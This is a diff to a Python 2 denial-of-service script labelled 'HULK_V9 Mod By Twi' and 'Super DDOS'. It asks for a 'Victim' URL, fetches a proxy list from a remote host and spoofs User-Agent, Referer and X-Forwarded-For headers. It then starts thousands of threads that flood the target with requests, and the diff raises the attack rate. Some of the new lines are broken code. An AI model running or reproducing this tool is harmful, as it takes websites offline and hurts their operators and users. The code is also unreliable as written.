@@ -19,7 +19,7 @@ import urlparse
 url='http://free-proxy-list.net/'
 proxy='http://free-proxy-list.net/'
 option=1
-checked_proxy=1
+checked_proxy=0
 url='http://free-proxy-list.net/'
 host='http://free-proxy-list.net/'
 option=1
@@ -27,12 +27,12 @@ checked_proxy=0
 headers_useragents=[9999]
 headers_referers=[9999]
 keyword_top=[9999]
-request_counter=10000000000000
+request_counter=100000000000
 flag=0
 safe=0
 def inc_counter():
  global request_counter
- request_counter+=100000
+ request_counter+=10000000
  
 def set_flag(val):
  global flag
@@ -45,7 +45,7 @@ def set_safe():
 def getUserAgent():
     platform = random.choice(['Macintosh', 'Windows', 'X11'])
     if platform == 'Macintosh':
-        os  = random.choice(['68K', 'PPC', 'Intel Mac OS X'])
+        os  = random.choice(['68K', 'PPC'])
     elif platform == 'Windows':
         os  = random.choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win95', 'Win98', 'Win 9x 4.90', 'WindowsCE', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows 10'])
     elif platform == 'X11':
@@ -53,7 +53,7 @@ def getUserAgent():
     browser = random.choice(['chrome', 'firefox', 'ie'])
     if browser == 'chrome':
         webkit = str(random.randint(500, 599))
-        version = str(random.randint(0, 44)) + '.0' + str(random.randint(0, 9999)) + '.' + str(random.randint(0, 999))
+        version = str(random.randint(1, 44)) + '.0' + str(random.randint(1, 1500)) + '.' + str(random.randint(1, 999))
         return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
     elif browser == 'firefox':
         currentYear = datetime.date.today().year
@@ -81,6 +81,7 @@ def getUserAgent():
             token = ''
         return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'
 
+
 def referer_list():
 
 	global headers_referers
@@ -93,10 +94,12 @@ def referer_list():
         headers_referers.append('https://developers.google.com/speed/pagespeed/insights/?url=')
         headers_referers.append('http://help.baidu.com/searchResult?keywords=')
         headers_referers.append('http://www.bing.com/search?q=')
+        headers_referers.append('https://www.microsoft.com/vi-vn/search/result.aspx?q=')
+        headers_referers.append('https://www.microsoft.com/en-us/Search/result.aspx?q=')
+        headers_referers.append('http://webcache.googleusercontent.com/search?q=cache:')		
         headers_referers.append('https://add.my.yahoo.com/rss?url=')
         headers_referers.append('https://play.google.com/store/search?q=')
         headers_referers.append('https://www.google.com.vn/?gws_rd=ssl#q=')
-	headers_referers.append('http://webcache.googleusercontent.com/search?q=cache:')
         headers_referers.append('http://yandex.ru/yandsearch?text=')  
         headers_referers.append('http://go.mail.ru/search?mail.ru=1&q=')
         headers_referers.append('http://www.ask.com/web?q=')
@@ -231,24 +234,48 @@ def referer_list():
         headers_referers.append('http://www.ask.com/web?q=')
         headers_referers.append('http://webcache.googleusercontent.com/search?q=cache:')
         headers_referers.append('http://www.google.com/?q=')
-        headers_referers.append('http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%..')      
-        headers_referers.append('http://engadget.search.aol.com/search?q=query?=query=..')
-        headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882')
-        headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925')
+        headers_referers.append('http://yandex.ru/search/?text=')      
+        headers_referers.append('https://www.google.ru/webhp?hl=ru&newwindow=1%3F&ei=HbAAVv-cE4SimQWWtKXIDQ#newwindow=1&hl=ru&q=')
+        headers_referers.append('https://www.google.ru/webhp?hl=ru&newwindow=1&ei=_K8AVrizNIGhmgXBzJbADQ#newwindow=1&hl=ru&q=')
         headers_referers.append('http://yandex.ru/yandsearch?text=')
-        headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832')
+        headers_referers.append('https://www.google.ru/webhp?hl=ru&newwindow=1&ei=1a8AVrbOL4K1mwXf5Z_YDQ#newwindow=1&hl=ru&q=')
         headers_referers.append('http://go.mail.ru/search?mail.ru=1&q=')
-        headers_referers.append('http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0..')
-        headers_referers.append('http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%..')
-        headers_referers.append('http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf..')
-        headers_referers.append('http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x..')
-        headers_referers.append('http://go.mail.ru/search?gay.ru.query=1&q=?abc.r..')
-        headers_referers.append('/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882')
-        headers_referers.append('http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B..')
-        headers_referers.append('http://www.google.ru/url?sa=t&rct=?j&q=&e..')       
-        headers_referers.append('https://translate.googleusercontent.com/translate_c?depth=1&hl=vi&rurl=translate.google.com.vn&sl=fa&tl=vi&u=')
-        headers_referers.append('https://translate.google.com.vn/translate?hl=vi&sl=fa&tl=en&u=')
-        headers_referers.append('https://translate.google.com/translate?hl=vi&sl=fa&tl=en&u=')
+        headers_referers.append('https://ru.search.yahoo.com/search;_ylt=AwrBTvYdrgBW50cAnoXKxgt.;_ylc=X1MDMjExNDcwMTAwMgRfcgMyBGZyAwRncHJpZANObGZEVHhuUVR3YUlzY0VpV0dZUGpBBG5fcnNsdAMwBG5fc3VnZwM3BG9yaWdpbgNydS5zZWFyY2gueWFob28uY29tBHBvcwMzBHBxc3RyAwRwcXN0cmwDMARxc3RybAMxMQRxdWVyeQNwYWx0YWxrLmNvbQR0X3N0bXADMTQ0Mjg4NTE5MQ--;_ylc=X1MDMjExNDcwMTAwMgRfcgMyBGZyAwRncHJpZANObGZEVHhuUVR3YUlzY0VpV0dZUGpBBG5fcnNsdAMwBG5fc3VnZwM3BG9yaWdpbgNydS5zZWFyY2gueWFob28uY29tBHBvcwMwBHBxc3RyAwRwcXN0cmwDBHFzdHJsAzExBHF1ZXJ5A3BhbHRhbGsuY29tBHRfc3RtcAMxNDQyODg1MTkz?p=')
+        headers_referers.append('http://nova.rambler.ru/search?query=')
+        headers_referers.append('https://ru.wikipedia.org/w/index.php?search=')
+        headers_referers.append('http://go.mail.ru/search?gay.ru.query=1&q=')
+        headers_referers.append('http://nova.rambler.ru/search?query=')
+        headers_referers.append('http://nova.rambler.ru/search?scroll=1&utm_source=nhp&utm_content=search&utm_medium=enter&utm_campaign=self_promo&query=')
+        headers_referers.append('http://nova.rambler.ru/search?topline=y&utm_source=soft&utm_campaign=new_topline&query=')
+        headers_referers.append('https://www.google.ru/?gws_rd=ssl#newwindow=1&q=')
+        headers_referers.append('https://www.google.com/webhp?sourceid=chrome-instant&ion=1&espv=2&ie=UTF-8#q=')
+        headers_referers.append('https://www.google.com/#q=')
+        headers_referers.append('https://www.google.com/search?client=opera&q=hotmail&sourceid=opera&ie=UTF-8&oe=UTF-8#q=')
+        headers_referers.append('https://vn.search.yahoo.com/search?p=')
+        headers_referers.append('https://www.google.com/search?q=paltalk.com&ie=utf-8&oe=utf-8#q=')
+        headers_referers.append('http://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=1&rsv_idx=1&tn=baidu&wd=')
+        headers_referers.append('http://govome4.insppartner.com/search/web?q=')
+        headers_referers.append('https://search.yahoo.com/search?p=')
+        headers_referers.append('http://go.mail.ru/search?gay.ru.query=1&q=')
+	headers_referers.append('http://www.google.com/?q=')
+	headers_referers.append('http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%..')
+	headers_referers.append('http://vk.com/profile.php?redirect=')
+	headers_referers.append('http://www.usatoday.com/search/results?q=')
+	headers_referers.append('http://engadget.search.aol.com/search?q=query?=query=..')
+	headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882')
+	headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925')
+	headers_referers.append('http://yandex.ru/yandsearch?text=')
+	headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832')
+	headers_referers.append('http://go.mail.ru/search?mail.ru=1&q=')
+	headers_referers.append('http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0..')
+	headers_referers.append('http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%..')
+	headers_referers.append('http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf..')
+	headers_referers.append('http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x..')
+	headers_referers.append('http://go.mail.ru/search?gay.ru.query=1&q=?abc.r..')
+	headers_referers.append('/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882')
+	headers_referers.append('http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B..')
+	headers_referers.append('http://www.google.ru/url?sa=t&rct=?j&q=&e..')
+	headers_referers.append('http://help.baidu.com/searchResult?keywords=')
         headers_referers.append('https://translate.google.com.vn/translate?sl=vi&tl=fa&js=y&prev=_t&hl=vi&ie=UTF-8&u=http%3A%2F%2Fpalstricksandbans.tripod.com%2Fid9.html&edit-text=')
         headers_referers.append('https://translate.google.com/translate?hl=vi&sl=en&tl=en&u=')
         headers_referers.append('https://translate.google.com/translate?hl=vi&sl=auto&tl=vi&u=')
@@ -264,8 +291,8 @@ def referer_list():
         headers_referers.append('https://translate.google.it/translate?hl=vi&sl=auto&tl=vi&u=')
         headers_referers.append('https://translate.google.ca/translate?hl=vi&sl=auto&tl=vi&u=')
         headers_referers.append('https://plus.url.google.com/url?sa=j&url=')
-        headers_referers.append('https://plus.google.com/u/0/share?url=')		
-
+        headers_referers.append('https://plus.google.com/u/0/share?url=')			
+     
 	return(headers_referers)
 
 def keyword_list():
@@ -483,12 +510,12 @@ def httpcall(url):
   param_joiner = "&"
  else:
   param_joiner = "?"
- request = urllib2.Request(url + param_joiner + buildblock(random.randint(8,10)) + '=' + buildblock(random.randint(8,10)))
+ request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,9)) + '=' + buildblock(random.randint(3,9)))
  request.add_header('User-Agent', getUserAgent())
  request.add_header('Cache-Control', 'no-cache')
  request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
- request.add_header('Referer', random.choice(headers_referers) + host + buildblock(random.randint(5,10)))
- request.add_header('Keep-Alive', random.randint(210,220))
+ request.add_header('Referer', random.choice(headers_referers) + random.choice(keyword_top) + host + buildblock(random.randint(5,10)))
+ request.add_header('Keep-Alive', random.randint(110,120))
  request.add_header('Connection', 'keep-alive')
  request.add_header('Host',host)
 
@@ -503,7 +530,7 @@ def httpcall(url):
  except urllib2.HTTPError, e:
    set_flag(1)
    code=500
-   time.sleep(60)
+   time.sleep(03)
  except urllib2.URLError, e:
    sys.exit()
  else:
@@ -525,12 +552,12 @@ class MonitorThread(threading.Thread):
  def run(self):
   previous=request_counter
   while flag==0:
-   if (previous+100000<request_counter) & (previous<>request_counter):
+   if (previous+1000000<request_counter) & (previous<>request_counter):
     previous=request_counter
    if flag==2:
     print ''
 
-#DIE_v8 Mod By Twi
+#HULK_V9 Mod By Twi
 def randomIp():
     random.seed()
     result = str(random.randint(1, 254)) + '.' + str(random.randint(1, 254))
@@ -540,7 +567,7 @@ def randomIp():
 def randomIpList():
     random.seed()
     res = ""
-    for ip in xrange(random.randint(8, 9)):
+    for ip in xrange(random.randint(7, 9)):
         res = res + randomIp() + ", "
     return res[0:len(res) - 2]
 class attacco(threading.Thread):
@@ -555,7 +582,7 @@ class attacco(threading.Thread):
  
         useragent = "User-Agent: " + getUserAgent() + "\r\n"
         forward   = "X-Forwarded-For: " + randomIpList() + "\r\n"
-        referer   = "Referer: "+ random.choice(headers_referers) + url + "?r="+ str(random.randint(1, 9999)) +  "\r\n"
+        referer   = "Referer: "+ random.choice(headers_referers) + url + "?r="+ str(random.randint(1, 1500)) +  "\r\n"	
         httprequest = get_host + useragent + referer + accept + forward + connection + "\r\n"
 
         while nload:
@@ -565,11 +592,14 @@ class attacco(threading.Thread):
         while 1:
             try:
                 a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                a = socket.connect((host, port))		
                 a.connect((proxy[0], int(proxy[1])))
                 a.send(httprequest)
+                a.send(portrequest)				
                 try:
                     for i in xrange(4):
                         a.send(httprequest)
+                        a.send(portrequest)						
                 except:
                     tts = 1
  
@@ -582,9 +612,15 @@ print '\n\t..:: > Edit By Twi < ::..'
 print '\t  ==> #~~ Super  DDOS ~~# <==  '
 # Site
 url = raw_input("Victim: ")
+port = raw_input( "Port:" )
 host_url = url.replace("http://", "").replace("https://", "").split('/')[0]
 #Proxy
 proxyf = urllib.urlopen("https://350adf0c87a0387a8100df99cb67bc325c711efb.googledrive.com/host/0B03s85BjEAHVfkpJaVZKdDFnQ25VTEJsZE5FMzhwUjBOa1VLUFdtRDhSR01qenZ1M1hZMWs/yyy.txt").read()
+listaproxy = proxyf.split('\n')
+#Proxy
+in_file = open(raw_input("File proxy: "),"r")
+proxyf = in_file.read()
+in_file.close() 
 listaproxy = proxyf.split('\n')
 #So luong
 thread = input("Number thread (40): ")
@@ -601,15 +637,18 @@ if url.count("/")==2:
     host = m.group(1)
 	
 for x in xrange(int(thread + 7800)):
+   
    attacco().start()
-   time.sleep(0.006)
+   time.sleep(0.001)
 	
 print "Attacking ==========================>>"
-for x in xrange(503):
- t = HTTPThread()
- t.start()
- t = MonitorThread()
- t.start()
- nload = 0
+
+for x in xrange(503, 521, 522):
+   t = HTTPThread()
+   t.start()
+   t = MonitorThread()
+   t.start()
+   nload = 0
+ 
 while not nload:
     time.sleep(1)
